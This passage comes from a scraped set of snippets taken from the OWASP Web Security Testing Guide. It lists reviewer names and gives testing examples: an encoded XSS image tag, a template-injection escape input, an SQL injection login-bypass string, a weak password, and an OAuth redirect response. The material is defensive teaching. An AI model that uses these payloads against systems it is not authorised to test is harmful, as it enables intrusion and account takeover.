https://github.com/owasp/wstg/blob/master/document/6-Appendix/E-History.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n- Anurag Agarwwal        - Giorgio Fedon        - Gianrico Ingrosso         - Mark Roxberry\n- Ferruh Mavituna        - Antonio Parata       - Andrew Van der Stock      - Marco Mella\n- Daniele Bellucci       - Adam Goodman         - Roberto Suggi Liverani    - Cecil Su\n- Kevin Horvath          - Marco Morana         - Harish Skanda Sureddy     - Pavol Luptak\n- Matteo Meucci          - Stefano Di Paola     - Christian Heinrich        - Marco Morana\n```\n\n----------------------------------------\n\nTITLE: Listing Reviewers for OWASP Testing Guide v3 in HTML\nDESCRIPTION: This HTML code block lists the reviewers who contributed to version 3 of the OWASP Testing Guide. It includes names of security professionals who reviewed and validated the content of this earlier version of the guide.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/E-History.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n- Marco Cova            - Matteo Meucci         - Rick Mitchell\n- Kevin Fuller          - Nam Nguyen\n```\n\n----------------------------------------\n\nTITLE: Hex Encoded XSS Injection Using HTML Entity Encoding\nDESCRIPTION: Shows a variation of hex-encoded XSS injection using HTML entity encoding. This technique can be used if '%' characters are being filtered.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/D-Encoded_Injection.md#2025-04-22_snippet_6\n\nLANGUAGE: html\nCODE:\n```\n<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>\n```\n\n----------------------------------------\n\nTITLE: SSTI Testing in Code Context - Successful Escape\nDESCRIPTION: This payload demonstrates successful template context escaping by breaking out of the template variable and injecting HTML that appears in the rendered output.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection.md#2025-04-22_snippet_6\n\nLANGUAGE: text\nCODE:\n```\npersonal_greeting=username}}<tag>\nHello user01 <tag>\n```\n\n----------------------------------------\n\nTITLE: Example of Numeric Weak Password in Markdown\nDESCRIPTION: Example of a simple numeric password that is extremely common and vulnerable to brute force attacks due to its predictability and simplicity.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Authentication_Methods.md#2025-04-22_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n`123456`\n```\n\n----------------------------------------\n\nTITLE: OAuth Authorization Response with Code\nDESCRIPTION: HTTP response showing the redirect with authorization code\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/05.1-Testing_for_OAuth_Authorization_Server_Weaknesses.md#2025-04-22_snippet_2\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 302 Found\nDate: Mon, 18 Oct 2021 20:46:44 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 340\nLocation: https://client.example.com/?code=example&state=example\n```\n\n----------------------------------------\n\nTITLE: Malicious User Input for SQL Injection\nDESCRIPTION: Example of malicious user input that can exploit the vulnerable stored procedure to bypass authentication.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_29\n\nLANGUAGE: sql\nCODE:\n```\nanyusername or 1=1'\nanypassword\n```"
  }
]